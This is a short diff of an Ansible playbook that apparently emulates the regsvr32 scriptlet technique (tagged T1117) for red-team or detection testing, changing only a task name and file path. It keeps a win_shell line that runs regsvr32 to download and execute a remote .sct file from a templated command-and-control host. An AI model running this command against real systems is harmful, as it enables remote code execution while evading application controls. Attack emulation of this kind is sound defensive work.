@@ -4,13 +4,13 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
-    - name: Run regsvr32 to download and execute script (create a new file c:\temp\evil.sct
+    - name: Run regsvr32 to download and execute script (create a new file evil.sct)
       win_shell: |
         regsvr32.exe /s /u /i:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }} scrobj.dll
     - name: check file exist
       tags: always
       win_stat:
-        path: c:\temp\evil.sct
+        path: evil.sct
       register: T1117
     - name: check if playbook was blocked
       tags: always
